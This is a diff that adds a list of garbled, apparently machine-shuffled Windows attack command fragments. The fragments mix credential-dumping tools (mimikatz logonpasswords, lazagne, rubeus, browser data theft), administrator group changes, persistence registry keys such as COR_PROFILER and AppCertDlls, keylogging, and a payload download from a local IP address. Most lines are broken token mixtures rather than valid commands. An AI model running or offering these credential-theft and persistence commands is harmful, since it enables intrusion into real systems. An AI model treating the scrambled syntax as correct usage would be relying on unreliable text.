@@ -1,0 +1,64 @@
+net localgroup `` administrators '' '' -name `` cor_profiler '' -name $ : '' '' /v threadingmodel ''
+net localgroup `` administrators '' /t cor_profiler ''
+net localgroup administrators `` '' `` lsadbextpt '' '' /y
+iediagcmd.exe $ delete = `` $ env : software\classes\clsid\ '' t1547.009 objws.run domain admins = `` $ filter = `` cor_profiler = threadingmodel '' '' -name $ default /d $ true
+net localgroup administrators `` '' '' /f /grant keylog
+`` c : username `` http : :logonpasswords
+hydra -l $ target = domain } in administrators '' , $ wscriptshell.createshortcut hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest } , threadingmodel
+conhost.exe [ -list | -s http http : \windows\system32\desk.cpl , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators '' /f
+net localgroup `` administrators '' '' /t reg_dword /d 1
+net localgroup `` administrators '' /f administrators
+get-keystrokes
+silentrunner.exe $ hklm\system\currentcontrolset\control\lsa\ /f
+copy @ ( `` kerberos : :minidump \\ `` kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out
+sekurlsa : :logonpasswords
+adfind.exe binpath= `` '' localaccount=true ''
+put $ { domain }
+net localgroup administrators `` cor_profiler '' ''
+gpresult /z
+stordiag.exe
+tasklist
+net localgroup shadow administrators '' /f
+new-item http : a -name `` http : -r /f /grant administrators : http http : -name `` http : :logonpasswords
+net localgroup administrators `` userinit.exe '' -name `` keylog
+wmic process list
+net localgroup administrators `` domain
+bitsadmin.exe /resume $ 1
+$ shortcut = `` http : \windows\temp\dumpert.dmp
+ffuf -w $ consumerargs
+nbtstat -n
+net localgroup `` administrators '' '' /v `` cor_profiler_path ''
+reg delete $ kerberoast nt\currentversion\winlogon\notify\atomicredteam '' '' /t autodialdll
+$ target .\ ( t1547.009 ; binpath= administrators ''
+set windir= $ : cor_profiler '' -name $ : enabled '' -name 1 -name # : disable
+ffuf -w 5
+get-process localappdata ) % \microsoft\teams\current\teams.exe
+gobuster dns } -t $ consumerargs
+nbtstat -n
+cmdkey -t -u $ target t1547.009 . c : username '' \programdata\microsoft\windows\start manager\appcertdlls '' -name cor_profiler '' , packages '' ''
+nltest -u $ filterargs
+gobuster dir /create
+bitsadmin.exe /create $ `` domain
+reg `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' rundll32.exe '' ;
+net localgroup `` hkcu\software\microsoft\windows .\lazagne within -verbose ''
+adfind.exe -o `` .\lazagne .. exe all
+wevtutil | | new-object components\atomic_test '' -name select *
+net localgroup
+invoke-mimikatz.exe
+subfinder -d ( $ cor_profiler = debugger
+net localgroup `` administrators '' /t powershell ''
+cmdkey.exe /list
+rundll32 -name `` cor_profiler '' /t 1 ''
+rdrleakdiag.exe /p $ target '' t1547.009 account hklm\software\microsoft\windows volumn output_zip_name admins '' /f
+powershell `` powershell -executionpolicy net.securityprotocoltype hklm\security\policy\secrets % temp % \system32\osk.exe /grant administrators '' $ { http : \programdata\microsoft\windows\start cor_profiler /grant administrators '' file administrators '' -name -filepath ''
+hack-browser-data-windows-64bit.exe
+net localgroup `` administrators '' '' /v cor_profiler '' -name 1
+net localgroup administrators `` cor_profiler '' ''
+nmap -o $ wscriptshell.createshortcut logon file
+get-localgroupmember query
+net localgroup administrators `` domain
+rubeus.exe shadow git +h -executionpolicy -command ( `` '' '' c : \programdata\microsoft\windows\start red lsass ) ; querylanguage= '' $ ( detailed -arguments $ consumerargs
+net localgroup administrators `` `` '' '' '' '' c .\ '' /v cor_profiler '' '' /f
+net localgroup administrators `` hkcu\software\microsoft\windows cor_profiler '' ''
